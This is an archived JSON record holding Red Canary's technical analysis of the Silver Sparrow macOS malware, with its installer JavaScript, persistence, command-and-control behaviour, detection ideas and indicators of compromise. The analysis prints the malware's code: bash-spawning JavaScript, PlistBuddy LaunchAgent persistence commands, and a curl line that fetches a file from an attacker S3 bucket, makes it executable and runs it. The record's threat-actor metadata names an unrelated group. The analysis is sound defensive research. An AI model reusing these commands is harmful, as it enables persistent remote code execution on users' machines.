{
    "id": "ada959fa-b23f-46c4-82ce-3e67d62b1aea",
    "created_at": "2023-01-12T15:06:44.576291Z",
    "updated_at": "2025-03-27T02:16:25.539623Z",
    "deleted_at": null,
    "sha1_hash": "f156e8312742f8fb2fcb158b497c71f9ee4bc742",
    "title": "2021-02-18 - Clipping Silver Sparrow’s wings- Outing macOS malware before it takes flight",
    "authors": "",
    "file_creation_date": "2022-05-28T05:06:37Z",
    "file_modification_date": "2022-05-28T05:06:37Z",
    "file_size": 386614,
    "plain_text": "# See what it's like to have a partner in the fight.\n\n**redcanary.com/blog/clipping-silver-sparrows-wings/**\n\n[Demo](https://redcanary.com/demo)\nShare\n\n[Resources •](https://redcanary.com/resources/) [Blog Detection and response](https://redcanary.com/blog/)\n\n## Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight\n\nSilver Sparrow is an activity cluster that includes a binary compiled to run on Apple’s new\nM1 chips but lacks one very important feature: a payload.\n\n[Tony Lambert•](https://redcanary.com/authors/tony-lambert)\n\n_Originally published . Last modified ._\n\n**UPDATE on 05/21/2021:** _A previous version of this blog stated that, “…Silver Sparrow had_\n**_infected 29,139 macOS endpoints….” We have updated it to state that the Silver Sparrow_**\n_activity cluster affected 29,139 macOS endpoints. This distinction may seem small, but it’s_\n_important because the Silver Sparrow activity cluster comprises multiple artifacts, including_\n_clearly malicious files and unusual or suspicious ones too. One file we chose to include in_\n_the cluster is the `._insu` file that seems to instruct the malware to remove itself from an_\n_endpoint. A subset of those 29,139 machines were infected by one of the two malicious_\n\n\n-----\n\n_packages described in this blog, while the majority contained the ._insu file check and_\n_were therefore affected by the overall Silver Sparrow activity cluster as we define it. Other_\n_teams may cluster this activity differently based on their assessments._\n\n[Earlier this month, Red Canary detection engineers Wes Hurd and Jason Killam came](https://redcanary.com/authors/jason-killam/)\n[across a strain of macOS malware using a LaunchAgent to establish persistence. Nothing](https://attack.mitre.org/techniques/T1543/001/)\nnew there. However, our investigation almost immediately revealed that this malware,\nwhatever it was, did not exhibit the behaviors that we’ve come to expect from the usual\nadware that so often targets macOS systems. The novelty of this downloader arises\nprimarily from the way it uses JavaScript for execution—something we hadn’t previously\nencountered in other macOS malware—and the emergence of a related binary compiled for\nApple’s new [M1 ARM64 architecture.](https://www.apple.com/mac/m1/)\n\nWe’ve dubbed this activity cluster “Silver Sparrow.”\n\n[Thanks to contributions from Erika Noerenberg and](https://twitter.com/gutterchurl) [Thomas Reed from](https://twitter.com/thomasareed) [Malwarebytes and](https://blog.malwarebytes.com/)\n[Jimmy Astle from](https://twitter.com/AstleJimmy) [VMware Carbon Black, we quickly realized that we were dealing with](https://www.carbonblack.com/blog/)\nwhat appeared to be a previously undetected strain of malware.\n\nAccording to data provided by Malwarebytes, the Silver Sparrow activity cluster affected\n29,139 macOS endpoints across 153 countries as of February 17, including high volumes\nof detection in the United States, the United Kingdom, Canada, France, and Germany.\n\nThough we haven’t observed Silver Sparrow delivering additional malicious payloads yet, its\nforward-looking M1 chip compatibility, global reach, relatively high infection rate, and\noperational maturity suggest Silver Sparrow is a reasonably serious threat, uniquely\npositioned to deliver a potentially impactful payload at a moment’s notice. Given these\ncauses for concern, in the spirit of transparency, we wanted to share everything we know\nwith the broader infosec industry sooner rather than later.\n\nThe rest of this post will be organized into the following sections:\n\nA technical analysis of two Silver Sparrow malware samples\nAn explanation of intelligence gaps and blindspots\nGuidance on detection opportunities for Silver Sparrow\nA list of indicators that we’ve encountered while investigating this threat\n\n## Technical analysis\n\n### What we analyzed\n\n\n-----\n\nOur investigation uncovered two versions of Silver Sparrow malware, which we will refer to\nas “version 1” and “version 2” throughout this post (see the Indicators of Compromise\nsection for a summary of indicators surrounding these two samples):\n\n**Malware version 1**\nFile name: updater.pkg (installer package for v1)\nMD5: 30c9bc7d40454e501c358f77449071aa\n[VirusTotal sample](https://www.virustotal.com/gui/file/1decb4070db4dfe5d68ba502cf3a67de96a69ea6f3acfa4454795f96472ccc0d/details)\n**Malware version 2**\nFile name: update.pkg (installer package for v2)\nMD5: fdd6fb2b1dfe07b0e57d4cbfef9c8149\n[VirusTotal sample](https://www.virustotal.com/gui/file/c7dd06b20b64b64d3b155b6b77c2778a08ef6a6c0396d7537af411258e57af1e/details)\n\nOutside of a change in download URLs and script comments, the two versions had only one\nmajor difference. The first version contained a Mach-O binary compiled for Intel x86_64\narchitecture only ( updater MD5: c668003c9c5b1689ba47a431512b03cc). In the second\nversion, the adversary included a Mach-O binary compiled for both Intel x86_64 and M1\nARM64 architectures ( tasker MD5: b370191228fef82635e39a137be470af). This is\nsignificant because the M1 ARM64 architecture is young, and researchers have uncovered\nvery few threats for the new platform.\n\nAs we’ll explain in detail in the technical analysis, the Mach-O compiled binaries don’t seem\nto do all that much—at least not as of this writing—and so we’ve been calling them\n“bystander binaries.” The following image represents a high-level look at the two versions of\nSilver Sparrow malware.\n\n\n-----\n\n### JavaScript in the installer\n\nWe’ve found that many macOS threats are distributed through malicious advertisements as\n[single, self-contained installers in PKG or](https://en.wikipedia.org/wiki/Installer_(macOS)) [DMG form, masquerading as a legitimate](https://en.wikipedia.org/wiki/Apple_Disk_Image)\napplication—such as Adobe Flash Player—or as updates. In this case, however, the\nadversary distributed the malware in two distinct packages: `updater.pkg and`\n```\nupdate.pkg . Both versions use the same techniques to execute, differing only in the\n\n```\ncompilation of the bystander binary.\n\nIn order of appearance, the first novel and noteworthy thing about Silver Sparrow is that its\ninstaller packages leverage the macOS Installer JavaScript API to execute suspicious\ncommands. While we’ve observed legitimate software doing this, this is the first instance\nwe’ve observed it in malware. This is a deviation from behavior we usually observe in\nmalicious macOS installers, which generally use preinstall or postinstall scripts to execute\ncommands . In preinstall and postinstall cases, the installation generates a particular\ntelemetry pattern that tends to look something like the following:\n\nParent process: `package_script_service`\nProcess: `bash,` `zsh,` `sh, Python, or another interpreter`\nCommand line: contains `preinstall or` `postinstall`\n\nThis telemetry pattern isn’t a particularly high-fidelity indicator of maliciousness on its own\nbecause even legitimate software uses the scripts, but it does reliably identify installers\nusing preinstall and postinstall scripts in general. Silver Sparrow differs from what we expect\n\n\n-----\n\nto see from malicious macOS installers by including JavaScript commands within the\npackage file’s Distribution definition XML file. This produces a different telemetry pattern:\n\nParent process: `Installer`\nProcess: `bash`\n\nAs with preinstall and postinstall scripts, this telemetry pattern isn’t enough to identify\nmalicious behavior on its own. Preinstall and postinstall scripts include command-line\narguments that offer clues into what’s actually getting executed. The malicious JavaScript\ncommands, on the other hand, run using the legitimate macOS Installer process and offer\nvery little visibility into the contents of the installation package or how that package uses the\nJavaScript commands.\n\nThe entry point to the code lives within the package’s `Distribution definition XML file,`\nwhich contains an installation-check tag specifying what function to execute during the\n[“Installation Check” phase:](https://developer.apple.com/library/archive/documentation/DeveloperTools/Reference/DistributionDefinitionRef/Chapters/Distribution_XML_Ref.html#//apple_ref/doc/uid/TP40005370-CH100-SW12)\n\nThe installer used three JavaScript functions for all the heavy lifting inside the\n“installation_check()” function :\n```\nfunction bash(command) {\n     system.run('/bin/bash', '-c', command)\n  }\n  function appendLine(line, file)\n  {\n    bash(`printf \"%b\\n\" '${line}' >> ${file}`)\n  }\n  function appendLinex(line, file)\n  {\n    bash(`\"echo\" ${line} >> ${file}`)\n  }\n  function appendLiney(line, file)\n  {\n    bash(`printf \"%b\" '${line}' >> ${file}`)\n  }\n\n```\nNote that in the code above, Silver Sparrow uses Apple’s `system.run command for`\n[execution. Apple documented the](https://developer.apple.com/documentation/installer_js/system/1812364-run) `system.run code as launching “a given program in the`\nResources directory of the installation package,” but it’s not limited to using the Resources\ndirectory. As observed with Silver Sparrow, you can provide the full path to a process for\nexecution and its arguments. By taking this route, the malware causes the installer to\nspawn multiple `bash processes that it can then use to accomplish its objectives.`\n\n\n-----\n\nThe functions `appendLine,` `appendLinex, and` `appendLiney extend the` `bash`\ncommands with arguments that write input to files on disk. Silver Sparrow writes each of its\ncomponents out line by line with JavaScript commands:\n```\nappendLine(`initTime=\\$1`, updaterMonitorPath)  \nappendLine(`/usr/bin/curl ${url} > /tmp/version.json`, updaterMonitorPath)\nappendLine(`plutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist`,\nupdaterMonitorPath)\nappendLine(`wait=$(/usr/libexec/PlistBuddy -c \"Print :dls\" /tmp/version.plist)`,\nupdaterMonitorPath)\nappendLine(`wait=\\$((\\$wait* 60 ))`, updaterMonitorPath)\nappendLine(`instVersion=1`, updaterMonitorPath)\n\n```\nThis approach may avoid simple static signatures by dynamically generating the script\nrather than using a static script file. In addition, the commands let the adversary quickly\nmodify the code to be much more versatile should they decide to make a change.\nAltogether, it means the adversary was likely attempting to evade detection and ease\ndevelopment.\n\nOnce all the commands get written, two new scripts exist on disk: `/tmp/agent.sh and`\n```\n~/Library/Application Support/verx_updater/verx.sh . The agent.sh script\n\n```\nexecutes immediately at the end of the installation to contact an adversary-controlled\nsystem and indicate that installation occurred. The `verx.sh script executes periodically`\nbecause of a persistent LaunchAgent to contact a remote host for more information.\n\n### Everyone needs a (Plist)Buddy\n\nOur initial indication of malicious activity was the `PlistBuddy process creating a`\nLaunchAgent, so let’s explore the significance of that.\n\nLaunchAgents provide a way to instruct `launchd, the macOS initialization system, to`\nperiodically or automatically execute tasks. They can be written by any user on the\nendpoint, but they will usually also execute as the user that writes them. For example, if the\nuser `tlambert writes` `~/Library/LaunchAgents/evil.plist the tasks described in`\n\n`evil.plist will usually execute as` `tlambert . For more information, refer to` Apple’s\ndocumentation.\n\n[While tools like osquery and antimalware controls have excellent visibility into the contents](https://osquery.io/schema/4.6.0/#launchd)\nof LaunchAgents, some endpoint detection and response (EDR) tools have a hard time\ngaining visibility into LaunchAgents. EDR tooling tends to rely on process monitoring that\noffers a great deal of visibility into the creation—but not necessarily the contents—of a file.\nFor example, an EDR tool might offer you the following shell command:\n```\ncp /Volumes/TotesLegit.app/Resources/launcher.plist\n~/Library/LaunchAgents/launcher plist\n\n```\n\n-----\n\nAs a result, detecting a persistence mechanism in the form of a malicious LaunchAgent can\nbe extremely difficult using EDR alone because it requires you to analyze surrounding\nactivity to make a decision about the installer itself. In other words: you know that the\nLaunchAgent can be used as a persistence mechanism, but—since you might not be able\nto see the contents of the LaunchAgent file—you have to rely on context to determine the\nintent of that LaunchAgent.\n\nThankfully, there are multiple ways to create property lists (plists) on macOS, and\nsometimes adversaries use different methods to achieve their needs. One such way is\nthrough `PlistBuddy, a built-in tool that allows you to create various property lists on an`\nendpoint, including LaunchAgents. Sometimes adversaries turn to `PlistBuddy to`\nestablish persistence, and doing so enables defenders to readily inspect the contents of a\nLaunchAgent using EDR because all the properties of the file get shown on the command\nline before writing. In Silver Sparrow’s case, we observed commands writing the content of\nthe plist:\n```\nPlistBuddy -c \"Add :Label string init_verx\" ~/Library/Launchagents/init_verx.plist\nPlistBuddy -c \"Add :RunAtLoad bool true\" ~/Library/Launchagents/init_verx.plist\nPlistBuddy -c \"Add :StartInterval integer 3600\"\n~/Library/Launchagents/init_verx.plist\nPlistBuddy -c \"Add :ProgramArguments array\" ~/Library/Launchagents/init_verx.plist\nPlistBuddy -c \"Add :ProgramArguments:0 string '/bin/sh'\"\n~/Library/Launchagents/init_verx.plist\nPlistBuddy -c \"Add :ProgramArguments:1 string -c\"\n~/Library/Launchagents/init_verx.plist\n\n```\nIn its final form on disk, the LaunchAgent Plist XML will resemble the following:\n```\n  Label\n  init_verx\n  RunAtLoad\n  true\n  StartInterval\n  3600\n  ProgramArguments\n  '/bin/sh'\n  -c\n  \"~/Library/Application\\\\ Support/verx_updater/verx.sh\" [timestamp] [data from\nplist downloaded] 1\n\n### Command and control (C2)\n\n```\n\n-----\n\nEvery hour, the persistence LaunchAgent tells `launchd to execute a shell script that`\ndownloads a JSON file to disk, converts it into a plist, and uses its properties to determine\nfurther actions.\n```\ncurl hxxps://specialattributes.s3.amazonaws[.]com/applications/updater/ver.json >\n/tmp/version.json\nplutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist\n...\ncurl $(/usr/libexec/PlistBuddy -c \"Print :downloadUrl\" /tmp/version.plist) --output\n/tmp/verx\nchmod 777 /tmp/verx\n/tmp/verx upbuchupsf\n\n```\nThe structure of the downloaded version.json file looks like this:\n```\n{\"version\":2,\"label\":\"verx\",\"args\":\"upbuchupsf\",\"dls\":4320,\"run\":true,\"loc\":\"~\\/Libra\n\n```\nEvery hour that `downloadUrl property gets checked for additional content to download`\nand executes. After observing the malware for over a week, neither we nor our research\npartners observed a final payload, leaving the ultimate goal of Silver Sparrow activity a\nmystery.\n\n[Silver Sparrow’s use of infrastructure hosted on AWS S3 is interesting because AWS offers](https://aws.amazon.com/s3/)\na highly available and resilient file distribution method. The adversary can create a bucket,\nserve out files, and operate without worrying about the additional network administration\nand overhead associated with doing all of this in house. In addition, callback domains for\n[this activity cluster leveraged domains hosted through Akamai CDN. This implies that the](https://www.akamai.com/us/en/resources/content-distribution-network.jsp)\nadversary likely understands cloud infrastructure and its benefits over a single server or\nnon-resilient system. Further, the adversary that likely understands this hosting choice\nallows them to blend in with the normal overhead of cloud infrastructure traffic. Most\norganizations cannot afford to block access to resources in AWS and Akamai. The decision\nto use AWS infrastructure further supports our assessment that this is an operationally\nmature adversary.\n\n### Mysteries on mysteries\n\nIn addition to the payload mystery, Silver Sparrow includes a file check that causes the\nremoval of all persistence mechanisms and scripts. It checks for the presence of\n```\n~/Library/._insu on disk, and, if the file is present, Silver Sparrow removes all of its\n\n```\n\n-----\n\ncomponents from the endpoint. Hashes reported from Malwarebytes\n( d41d8cd98f00b204e9800998ecf8427e ) indicated that the `._insu file was empty. The`\npresence of this feature is also something of a mystery.\n```\nif [ -f ~/Library/._insu ]\n  then  \n    rm ~/Library/Launchagents/verx.plist\n    rm ~/Library/Launchagents/init_verx.plist\n    rm /tmp/version.json\n    rm /tmp/version.plist\n    rm /tmp/verx\n    rm -r ~/Library/Application\\\\ Support/verx_updater\n    rm /tmp/agent.sh\n    launchctl remove init_verx\n\n```\nThe `._insu file does not appear present by default on macOS, and we currently don’t`\nknow the circumstances under which the file appears.\n\n### The final callback\n\nAt the end of the installation, Silver Sparrow executes two discovery commands to construct\ndata for a `curl HTTP POST request indicating that the installation occurred. One`\nretrieves the system UUID for reporting, and the second finds more interesting information:\nthe URL used to download the original package file.\n\nBy executing a sqlite3 query, the malware finds the original URL the PKG downloaded from,\ngiving the adversary an idea of successful distribution channels. We commonly see this kind\nof activity with malicious adware on macOS.\n```\nsqlite3 sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV*\n'select LSQuarantineDataURLString from LSQuarantineEvent where\nLSQuarantineDataURLString like “[redacted]\" order by LSQuarantineTimeStamp desc'\n\n### Hello, World: bystander binaries\n\n```\nThe first version of Silver Sparrow malware ( updater.pkg MD5:\n30c9bc7d40454e501c358f77449071aa) that we analyzed contained an extraneous Mach-O\nbinary ( updater MD5: c668003c9c5b1689ba47a431512b03cc), compiled for Intel x86_64\nthat appeared to play no additional role in the Silver Sparrow execution. Ultimately this\nbinary seems to have been included as placeholder content to give the PKG something to\ndistribute outside the JavaScript execution. It simply says, “Hello, World!” (literally!)\n\n\n-----\n\n_v1 Image Credit: Erika Noerenberg_\nThe second version ( update.pkg MD5: fdd6fb2b1dfe07b0e57d4cbfef9c8149) also\nincluded an extraneous Mach-O binary ( tasker MD5:\nb370191228fef82635e39a137be470af) that was compiled to be compatible with both\nIntelx86_64 and M1 ARM64. Like before, this binary seems to have been included as a\nplaceholder—this time, displaying the message “You did it!”\n\n\n-----\n\n_v2 Image Credit: Jimmy Astle_\nYou can observe the dual architecture support from version 2 of the extraneous Mach-O\nbinary by checking out the output of `file command on macOS or Linux systems`\nexamining the binary:\n```\ntasker: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit x86_64\nexecutable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>] [arm64:Mach-O 64-bit arm64\nexecutable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>]\n\n```\nBy contrast, the output of the `file command from the extraneous Mach-O binary in`\nversion 1 would look like the following:\n```\nupdater: Mach-O 64-bit x86_64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>\n\n### Timeline\n\n```\nWe don’t have a complete picture of exactly when Silver Sparrow first emerged, but we’ve\nbeen able to construct the following timeline through a mix of open source intelligence and\nRed Canary telemetry:\n\n1. August 18, 2020: Malware version 1 (non-M1 version) callback domain\n```\n   api.mobiletraits[.]com created (source)\n\n```\n[2. August 31, 2020: Malware version 1 (non-M1 version) submitted to VirusTotal (source)](https://www.virustotal.com/gui/file/1decb4070db4dfe5d68ba502cf3a67de96a69ea6f3acfa4454795f96472ccc0d/submissions)\n\n\n-----\n\n3. September 2, 2020: `version.json file seen during malware version 2 execution`\n\n[submitted to VirusTotal (source)](https://www.virustotal.com/gui/file/fe3dfc11884801b6d1d331fb85f8ef822d8d4ecf329d9e71048b87b93bafe01b/details)\n4. December 5, 2020: Malware version 2 (M1 version) callback domain created\n```\n   api.specialattributes[.]com created (source)\n\n```\n5. January 22, 2021: PKG file version 2 (containing a M1 binary) submitted to VirusTotal\n\n[(source)](https://www.virustotal.com/gui/file/c7dd06b20b64b64d3b155b6b77c2778a08ef6a6c0396d7537af411258e57af1e/details)\n6. January 26, 2021: Red Canary detects Silver Sparrow malware version 1\n7. February 9, 2021: Red Canary detects Silver Sparrow malware version 2 (M1 version)\n\n## Intelligence gaps\n\nAt the time of publishing, we’ve identified a few unknown factors related to Silver Sparrow\nthat we either don’t have visibility into or simply enough time hasn’t passed to observe.\nFirst, we aren’t certain of the initial distribution method for the PKG files. We suspect that\nmalicious search engine results direct victims to download the PKGs based on network\nconnections from a victim’s browser shortly before download. In this case we can’t be\ncertain because we don’t have the visibility to determine exactly what caused the download.\n\nNext, we don’t know the circumstances under which `~/Library/._insu appears. This file`\nmay be part of a toolset the adversary wishes to avoid; it may be part of the malware’s life\ncycle itself as a way of removing components after an objective has been met.\n\nIn addition, the ultimate goal of this malware is a mystery. We have no way of knowing with\ncertainty what payload would be distributed by the malware, if a payload has already been\ndelivered and removed, or if the adversary has a future timeline for distribution. Based on\ndata shared with us by Malwarebytes, the nearly 30,000 affected hosts have not\ndownloaded what would be the next or final payload.\n\nFinally, the purpose of the Mach-O binary included inside the PKG files is also a mystery.\nBased on the data from script execution, the binary would only run if a victim intentionally\nsought it out and launched it. The messages we observed of “Hello, World!” or “You did it!”\ncould indicate the threat is under development in a proof-of-concept stage or that the\nadversary just needed an application bundle to make the package look legitimate.\n\n## Detection opportunities\n\nThe following section includes descriptions of the analytics that have helped us detect the\nSilver Sparrow downloader. That said, we didn’t build these analytics specifically for the\npurpose of detecting Silver Sparrow, so they may be useful for detecting a wide array of\nmacOS threats. If one of these analytics alerts you to potentially malicious activity, we\nrecommend searching for the presence of indicators (listed below) to confirm whether you\nare dealing with a Silver Sparrow infection or something else.\n\n\n-----\n\nLook for a process that appears to be `PlistBuddy executing in conjunction with a`\ncommand line containing the following: `LaunchAgents and` `RunAtLoad and` `true .`\nThis analytic helps us find multiple macOS malware families establishing\nLaunchAgent persistence.\nLook for a process that appears to be `sqlite3 executing in conjunction with a`\ncommand line that contains: `LSQuarantine . This analytic helps us find multiple`\nmacOS malware families manipulating or searching metadata for downloaded files.\nLook for a process that appears to be `curl executing in conjunction with a`\ncommand line that contains: `s3.amazonaws.com . This analytic helps us find multiple`\nmacOS malware families using S3 buckets for distribution.\n\n## Indicators of Compromise\n\n### In Versions 1 & 2\n\n~/Library/._insu (empty file used to signal the malware to delete itself)\n/tmp/agent.sh (shell script executed for installation callback)\n\n/tmp/version.json (file downloaded from from S3 to determine execution flow)\n\n/tmp/version.plist (version.json converted into a property list)\n\n### Malware Version 1\n\nFile name: updater.pkg (installer package for v1)\n\nMD5: 30c9bc7d40454e501c358f77449071aa\n\nFile name: updater (bystander Mach-O Intel binary in v1 package)\n\nMD5: c668003c9c5b1689ba47a431512b03cc\n\nmobiletraits.s3.amazonaws[.]com (S3 bucket holding version.json for v1)\n\n~/Library/Application Support/agent_updater/agent.sh (v1 script that executes every hour)\n\n/tmp/agent (file containing final v1 payload if distributed)\n\n~/Library/Launchagents/agent.plist (v1 persistence mechanism)\n\n~/Library/Launchagents/init_agent.plist (v1 persistence mechanism)\n\nDeveloper ID Saotia Seay (5834W6MYX3) – v1 bystander binary signature revoked by\nApple\n\n**Package content and structure**\n\n\n-----\n\n```\n.\n├── Distribution *\n└── updater.pkg\n  ├── Bom\n  ├── PackageInfo\n  ├── Payload\n  └── updater.app\n    └── Contents\n      ├── _CodeSignature\n      │  └── CodeResources\n      ├── Info.plist\n      ├── MacOS\n      │  └── updater *\n      ├── PkgInfo\n      └── Resources\n        └── Base.lproj\n          └── Main.storyboardc\n            ├── Info.plist\n            └── MainMenu.nib\n(*) Contains executable code\n\n### Malware Version 2\n\n```\nFile name: update.pkg (installer package for v2)\n\nMD5: fdd6fb2b1dfe07b0e57d4cbfef9c8149\n\ntasker.app/Contents/MacOS/tasker (bystander Mach-O Intel & M1 binary in v2)\n\nMD5: b370191228fef82635e39a137be470af\n\nspecialattributes.s3.amazonaws[.]com (S3 bucket holding version.json for v2)\n\n~/Library/Application Support/verx_updater/verx.sh (v2 script that executes every hour)\n\n/tmp/verx (file containing final v2 payload if distributed)\n\n~/Library/Launchagents/verx.plist (v2 persistence mechanism)\n\n~/Library/Launchagents/init_verx.plist (v2 persistence mechanism)\n\nDeveloper ID Julie Willey (MSZ3ZH74RK) – v2 bystander binary signature revoked by\nApple\n\n**Package content and structure**\n\n\n-----\n\n```\n .\n ├── Distribution *\n └── tasker.pkg\n   ├── Bom\n   ├── PackageInfo\n   ├── Payload\n   └── tasker.app\n     └── Contents\n       ├── _CodeSignature\n       │  └── CodeResources\n       ├── Info.plist\n       ├── MacOS\n       │  └── tasker *\n       ├── PkgInfo\n       └── Resources\n         └── Base.lproj\n           └── Main.storyboardc\n             ├── Info.plist\n             └── MainMenu.nib\n (*) Contains executable code\n\n```\nIf you’ve been tracking similar activity, we’d love to hear from you and collaborate. Contact\n[blog@redcanary.com with any observations or questions.](http://10.10.0.46/mailto:blog@redcanary.com)\n\nRelated Articles\n\nDetection and response\n\n### ChromeLoader: a pushy malvertiser\n\nDetection and response\n\n### Intelligence Insights: May 2022\n\nDetection and response\n\n### The Goot cause: Detecting Gootloader and its follow-on activity\n\nDetection and response\n\n### Marshmallows & Kerberoasting\n\n\n-----\n\n**Subscribe to our blog**\n\nDownload the report\n\nAll 2021 Threat Detection Report content is fully available through this website. If you prefer\nto download a PDF, just fill out this form and let us know what email to send it to.\n\n**Thanks for your interest!**\n\nCheck your inbox, the 2021 Threat Detection Report is headed your way.\n\nOur website uses cookies to provide you with a better browsing experience. More\n[information can be found in our Privacy Policy.](https://redcanary.com/privacy-policy)\n\nX\nPrivacy & Cookies Policy\n\n**Privacy Overview**\n\nThis website uses cookies to improve your experience while you navigate through the\nwebsite. Out of these cookies, the cookies that are categorized as necessary are stored on\nyour browser as they are essential for the working of basic functionalities of the website. We\nalso use third-party cookies that help us analyze and understand how you use this website.\nThese cookies will be stored in your browser only with your consent. You also have the\noption to opt-out of these cookies. But opting out of some of these cookies may have an\neffect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category\nonly includes cookies that ensures basic functionalities and security features of the website.\nThese cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used\nspecifically to collect user personal data via analytics, ads, other embedded contents are\ntermed as non-necessary cookies. It is mandatory to procure user consent prior to running\nthese cookies on your website.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-18 - Clipping Silver Sparrow’s wings- Outing macOS malware before it takes flight.pdf"
    ],
    "report_names": [
        "2021-02-18 - Clipping Silver Sparrow’s wings- Outing macOS malware before it takes flight.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536004,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653714397,
    "ts_modification_date": 1653714397,
    "files": {
        "pdf": "https://archive.orkl.eu/f156e8312742f8fb2fcb158b497c71f9ee4bc742.pdf",
        "text": "https://archive.orkl.eu/f156e8312742f8fb2fcb158b497c71f9ee4bc742.txt",
        "img": "https://archive.orkl.eu/f156e8312742f8fb2fcb158b497c71f9ee4bc742.jpg"
    }
}